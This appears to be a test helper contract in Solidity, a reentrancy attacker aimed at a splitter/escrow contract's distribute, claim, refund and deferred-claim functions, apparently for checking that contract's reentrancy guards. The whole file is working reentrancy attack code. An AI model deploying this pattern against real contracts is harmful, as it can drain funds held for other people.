// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

interface ICoreSplitter {
    function distribute() external;
    function claimEscrow(uint256 escrowId, uint256 claimAmount) external;
    function refundEscrow(uint256 escrowId) external;
    function executeDeferredClaim(uint256 claimId) external;
    function createEscrow(
        address payee,
        uint256 maxAmount,
        bytes32 taskId,
        uint256 duration
    ) external payable returns (uint256);
}

contract ReentrancyAttacker {
    ICoreSplitter public target;
    uint256 public attackCount;
    uint256 public maxAttacks;
    string public attackFunction;
    uint256 public escrowId;
    uint256 public claimAmount;

    constructor(address _target) {
        target = ICoreSplitter(_target);
    }

    function attackDistribute(uint256 _maxAttacks) external {
        attackFunction = "distribute";
        maxAttacks = _maxAttacks;
        attackCount = 0;
        target.distribute();
    }

    function attackClaimEscrow(uint256 _escrowId, uint256 _claimAmount, uint256 _maxAttacks) external {
        attackFunction = "claimEscrow";
        escrowId = _escrowId;
        claimAmount = _claimAmount;
        maxAttacks = _maxAttacks;
        attackCount = 0;
        target.claimEscrow(_escrowId, _claimAmount);
    }

    function attackRefund(uint256 _escrowId, uint256 _maxAttacks) external {
        attackFunction = "refundEscrow";
        escrowId = _escrowId;
        maxAttacks = _maxAttacks;
        attackCount = 0;
        target.refundEscrow(_escrowId);
    }

    function attackExecuteDeferredClaim(uint256 _claimId, uint256 _maxAttacks) external {
        attackFunction = "executeDeferredClaim";
        escrowId = _claimId;
        maxAttacks = _maxAttacks;
        attackCount = 0;
        target.executeDeferredClaim(_claimId);
    }

    /// @dev Allows the attacker contract to create an escrow (becoming the payer)
    ///      so that refundEscrow sends ETH back here, triggering receive().
    function createEscrowOnTarget(
        address payee,
        uint256 maxAmount,
        bytes32 taskId,
        uint256 duration
    ) external payable returns (uint256) {
        return target.createEscrow{value: msg.value}(payee, maxAmount, taskId, duration);
    }

    receive() external payable {
        attackCount++;
        if (attackCount < maxAttacks) {
            if (keccak256(bytes(attackFunction)) == keccak256("distribute")) {
                try target.distribute() {} catch {}
            } else if (keccak256(bytes(attackFunction)) == keccak256("claimEscrow")) {
                try target.claimEscrow(escrowId, claimAmount) {} catch {}
            } else if (keccak256(bytes(attackFunction)) == keccak256("refundEscrow")) {
                try target.refundEscrow(escrowId) {} catch {}
            } else if (keccak256(bytes(attackFunction)) == keccak256("executeDeferredClaim")) {
                try target.executeDeferredClaim(escrowId) {} catch {}
            }
        }
    }
}
